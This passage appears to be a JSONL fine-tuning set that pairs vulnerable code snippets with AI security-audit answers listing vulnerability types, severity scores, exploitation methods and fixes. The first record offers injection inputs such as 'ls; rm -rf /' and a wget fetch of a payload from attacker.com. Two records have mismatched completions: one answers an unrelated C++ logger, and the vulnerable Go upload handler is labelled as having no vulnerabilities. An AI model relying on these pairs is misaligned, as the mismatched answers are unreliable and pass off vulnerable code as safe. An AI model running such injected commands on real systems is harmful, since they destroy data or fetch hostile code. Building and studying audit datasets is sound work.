unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"run_shell_command\",\n  \"component_code\": \"import os\\n\\ndef run_shell_command(cmd):\\n    os.system(cmd)\",\n  \"component_description\": \"Python function executing system commands based on input.\"\n}", "completion": "{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"run_shell_command\",\n  \"component_code\": \"import os\\n\\ndef run_shell_command(cmd):\\n    os.system(cmd)\",\n  \"component_description\": \"Python function executing system commands based on input.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Command Injection\",\n      \"cve_score\": 9.6,\n      \"exploitation_methods\": [\n        \"Input: ls; rm -rf / to cause data loss.\",\n        \"Inject '&& wget attacker.com/payload.sh' to fetch malicious files.\",\n        \"Escape shell with input like `cmd` or $() syntax.\"\n      ],\n      \"developer_fixes\": [\n        \"Avoid using os.system with raw user input.\",\n        \"Use subprocess with argument list or command whitelisting.\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"GLOBAL_CODE\",\n  \"component_name\": \"HeaderInjectionAttack\",\n  \"component_code\": \"const express = require('express');\\nconst app = express();\\napp.get('/custom-header', (req, res) => {\\n  const userHeader = req.query.header;\\n  res.setHeader('X-Custom-Header', userHeader);\\n  res.send('Header set');\\n});\",\n  \"component_description\": \"Node.js server setting HTTP headers directly from user input.\"\n}", "completion": "{\n  \"component_type\": \"GLOBAL_CODE\",\n  \"component_name\": \"HeaderInjectionAttack\",\n  \"component_code\": \"const express = require('express');\\nconst app = express();\\napp.get('/custom-header', (req, res) => {\\n  const userHeader = req.query.header;\\n  res.setHeader('X-Custom-Header', userHeader);\\n  res.send('Header set');\\n});\",\n  \"component_description\": \"Node.js server setting HTTP headers directly from user input.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"HTTP Response Splitting\",\n      \"cve_score\": 8.3,\n      \"exploitation_methods\": [\n        \"Split headers by injecting \\r\\n characters.\",\n        \"Inject fake responses or redirect victims.\"\n      ],\n      \"developer_fixes\": [\n        \"Sanitize user inputs for header values.\",\n        \"Strip \\r and \\n characters.\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"CLASS_DEFINITION\",\n  \"component_name\": \"AdminController\",\n  \"component_code\": \"using Microsoft.AspNetCore.Mvc;\\nusing System.Linq;\\n\\n[Route(\\\"api/admin\\\")]\\n[ApiController]\\npublic class AdminController : ControllerBase\\n{\\n    private readonly ApplicationDbContext _context;\\n    \\n    public AdminController(ApplicationDbContext context)\\n    {\\n        _context = context;\\n    }\\n    \\n    [HttpGet(\\\"users\\\")]\\n    public IActionResult GetAllUsers([FromQuery] string sort = \\\"id\\\", [FromQuery] int limit = 100)\\n    {\\n        // No permission checks\\n        \\n        // Dangerous dynamic sorting\\n        var users = _context.Users\\n            .OrderBy(u => $\\\"u.{sort}\\\") // Potential for injection\\n            .Take(limit)\\n            .Select(u => new \\n            {\\n                u.Id,\\n                u.Email,\\n                u.Role,\\n                u.LastLogin,\\n                u.IsActive\\n            })\\n            .ToList();\\n            \\n        return Ok(users);\\n    }\\n    \\n    [HttpPost(\\\"impersonate\\\")]\\n    public IActionResult ImpersonateUser([FromBody] int userId)\\n    {\\n        // No audit logging\\n        var user = _context.Users.Find(userId);\\n        \\n        if (user == null)\\n            return NotFound();\\n            \\n        // Generate token with elevated claims\\n        var token = GenerateToken(user.Id, user.Email, \\\"Admin\\\");\\n        \\n        return Ok(new { Token = token });\\n    }\\n    \\n    [HttpGet(\\\"logs\\\")]\\n    public IActionResult GetSystemLogs([FromQuery] string filter = \\\"\\\")\\n    {\\n        // Exposes raw log files\\n        var logPath = Path.Combine(Directory.GetCurrentDirectory(), \\\"logs\\\");\\n        var logFiles = Directory.GetFiles(logPath, $\\\"*{filter}*.log\\\");\\n        \\n        // No sanitization of file paths\\n        var logContents = logFiles.Select(file => new \\n        {\\n            FileName = file,\\n            Content = System.IO.File.ReadAllText(file)\\n        });\\n        \\n        return Ok(logContents);\\n    }\\n    \\n    private string GenerateToken(int userId, string email, string role)\\n    {\\n        // Token generation logic\\n        return \\\"...\\\";\\n    }\\n}\",\n  \"component_description\": \"ASP.NET Core admin API controller\"\n}", "completion": "{\n  \"component_type\": \"CLASS_DEFINITION\",\n  \"component_name\": \"AdminController\",\n  \"component_code\": \"using Microsoft.AspNetCore.Mvc;\\nusing System.Linq;\\n\\n[Route(\\\"api/admin\\\")]\\n[ApiController]\\npublic class AdminController : ControllerBase\\n{\\n    private readonly ApplicationDbContext _context;\\n    \\n    public AdminController(ApplicationDbContext context)\\n    {\\n        _context = context;\\n    }\\n    \\n    [HttpGet(\\\"users\\\")]\\n    public IActionResult GetAllUsers([FromQuery] string sort = \\\"id\\\", [FromQuery] int limit = 100)\\n    {\\n        // No permission checks\\n        \\n        // Dangerous dynamic sorting\\n        var users = _context.Users\\n            .OrderBy(u => $\\\"u.{sort}\\\") // Potential for injection\\n            .Take(limit)\\n            .Select(u => new \\n            {\\n                u.Id,\\n                u.Email,\\n                u.Role,\\n                u.LastLogin,\\n                u.IsActive\\n            })\\n            .ToList();\\n            \\n        return Ok(users);\\n    }\\n    \\n    [HttpPost(\\\"impersonate\\\")]\\n    public IActionResult ImpersonateUser([FromBody] int userId)\\n    {\\n        // No audit logging\\n        var user = _context.Users.Find(userId);\\n        \\n        if (user == null)\\n            return NotFound();\\n            \\n        // Generate token with elevated claims\\n        var token = GenerateToken(user.Id, user.Email, \\\"Admin\\\");\\n        \\n        return Ok(new { Token = token });\\n    }\\n    \\n    [HttpGet(\\\"logs\\\")]\\n    public IActionResult GetSystemLogs([FromQuery] string filter = \\\"\\\")\\n    {\\n        // Exposes raw log files\\n        var logPath = Path.Combine(Directory.GetCurrentDirectory(), \\\"logs\\\");\\n        var logFiles = Directory.GetFiles(logPath, $\\\"*{filter}*.log\\\");\\n        \\n        // No sanitization of file paths\\n        var logContents = logFiles.Select(file => new \\n        {\\n            FileName = file,\\n            Content = System.IO.File.ReadAllText(file)\\n        });\\n        \\n        return Ok(logContents);\\n    }\\n    \\n    private string GenerateToken(int userId, string email, string role)\\n    {\\n        // Token generation logic\\n        return \\\"...\\\";\\n    }\\n}\",\n  \"component_description\": \"ASP.NET Core admin API controller\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Insecure Direct Object Reference (IDOR)\",\n      \"cve_score\": 8.5,\n      \"exploitation_methods\": [\n        \"1. Access any user data without authorization\\n2. Modify parameters to access other records\",\n        \"1. Exploit impersonation to gain admin rights\"\n      ],\n      \"developer_fixes\": [\n        \"Implement role-based access control\",\n        \"Add resource ownership validation\"\n      ]\n    },\n    {\n      \"vul_type\": \"Path Traversal\",\n      \"cve_score\": 7.9,\n      \"exploitation_methods\": [\n        \"1. Inject '../' in filter parameter\\n2. Access arbitrary system files\",\n        \"1. Read sensitive config files via log endpoint\"\n      ],\n      \"developer_fixes\": [\n        \"Sanitize file path inputs\",\n        \"Implement allow-list for file access\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"INTERFACE_DEFINITION\",\n  \"component_name\": \"PaymentInfo\",\n  \"component_code\": \"interface PaymentInfo {\\n  cardNumber: string;\\n  expiryDate: string;\\n  cvv: string;\\n}\",\n  \"component_description\": \"TypeScript interface representing basic credit card payment information structure.\"\n}", "completion": "{\n  \"component_type\": \"CLASS_DEFINITION\",\n  \"component_name\": \"SecureLogger\",\n  \"component_code\": \"#include <iostream>\\n#include <fstream>\\n#include <string>\\n\\nclass SecureLogger {\\nprivate:\\n    std::ofstream logfile;\\n\\npublic:\\n    SecureLogger(const std::string& filename) {\\n        logfile.open(filename, std::ios::app);\\n    }\\n\\n    void log(const std::string& userInput) {\\n        logfile << userInput << std::endl;\\n    }\\n\\n    ~SecureLogger() {\\n        if (logfile.is_open()) {\\n            logfile.close();\\n        }\\n    }\\n};\",\n  \"component_description\": \"C++ class for logging user inputs directly into a log file without sanitization.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Log Injection\",\n      \"cve_score\": 7.4,\n      \"exploitation_methods\": [\n        \"Inject newline characters to spoof log entries\",\n        \"Create fake security alerts or tamper audit logs\",\n        \"Insert malicious commands that later get parsed\"\n      ],\n      \"developer_fixes\": [\n        \"Sanitize log input by removing control characters\",\n        \"Escape newline and delimiter characters before writing\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"GLOBAL_CODE\",\n  \"component_name\": \"ProfileImageUploader\",\n  \"component_code\": \"package main\\n\\nimport (\\n    \\\"fmt\\\"\\n    \\\"net/http\\\"\\n    \\\"os\\\"\\n)\\n\\nfunc uploadHandler(w http.ResponseWriter, r *http.Request) {\\n    r.ParseMultipartForm(10 << 20)\\n    file, handler, err := r.FormFile(\\\"uploadFile\\\")\\n    if err != nil {\\n        fmt.Println(\\\"Error Retrieving the File\\\")\\n        return\\n    }\\n    defer file.Close()\\n\\n    f, _ := os.Create(\\\"uploads/\\\" + handler.Filename)\\n    defer f.Close()\\n    _, _ = f.ReadFrom(file)\\n    fmt.Fprintf(w, \\\"File uploaded successfully: %s\\\", handler.Filename)\\n}\\n\\nfunc main() {\\n    os.MkdirAll(\\\"uploads\\\", os.ModePerm)\\n    http.HandleFunc(\\\"/upload\\\", uploadHandler)\\n    http.ListenAndServe(\\\":8080\\\", nil)\\n}\",\n  \"component_description\": \"Basic Go HTTP server allowing users to upload files to the server without proper validation.\"\n}", "completion": "{\n  \"component_type\": \"INTERFACE_DEFINITION\",\n  \"component_name\": \"PaymentInfo\",\n  \"component_code\": \"interface PaymentInfo {\\n  cardNumber: string;\\n  expiryDate: string;\\n  cvv: string;\\n}\",\n  \"component_description\": \"TypeScript interface representing basic credit card payment information structure.\",\n  \"vulnerabilities\": []\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"GLOBAL_CODE\",\n  \"component_name\": \"XSSVulnerable\",\n  \"component_code\": \"const express = require('express');\\nconst app = express();\\napp.get('/search', (req, res) => {\\n  const query = req.query.q;\\n  res.send(`<h1>Results for: ${query}</h1>`);\\n});\",\n  \"component_description\": \"Node.js route embedding unsanitized user input into HTML response.\"\n}", "completion": "{\n  \"component_type\": \"GLOBAL_CODE\",\n  \"component_name\": \"XSSVulnerable\",\n  \"component_code\": \"const express = require('express');\\nconst app = express();\\napp.get('/search', (req, res) => {\\n  const query = req.query.q;\\n  res.send(`<h1>Results for: ${query}</h1>`);\\n});\",\n  \"component_description\": \"Node.js route embedding unsanitized user input into HTML response.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Reflected XSS\",\n      \"cve_score\": 8.5,\n      \"exploitation_methods\": [\n        \"Inject script tags to execute malicious JavaScript.\",\n        \"Exploit users visiting crafted search URLs.\"\n      ],\n      \"developer_fixes\": [\n        \"Escape HTML special characters in output.\",\n        \"Use libraries or frameworks that auto-escape output.\"\n      ]\n    }\n  ]\n}"}
